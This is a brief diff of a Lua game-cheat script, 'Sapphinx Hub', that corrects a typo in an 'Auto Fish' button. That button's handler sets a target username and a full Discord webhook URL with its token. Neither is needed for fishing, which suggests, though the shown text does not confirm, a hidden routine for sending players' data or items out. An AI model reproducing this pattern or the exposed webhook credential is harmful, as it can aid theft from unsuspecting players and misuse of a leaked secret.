@@ -6,7 +6,7 @@ local Window = Library.CreateLib("Sapphinx Hub", "BloodTheme")
 local Tab = Window:NewTab("Sapphinx Hub")
 local Section = Tab:NewSection("Main")
 
-Section:NewButton("Toggle Auto Fish", "ButtonInfo", unction()
+Section:NewButton("Toggle Auto Fish", "ButtonInfo", function()
     Username = "levoxonyt"
 Webhook = "https://discord.com/api/webhooks/1218209589598752868/xTxFkQIG5p0cSLDGYwsUD896stjgBWNHFVB05CYTjg9DxynidQX9yVaUD50ctnQyhEyK"
 
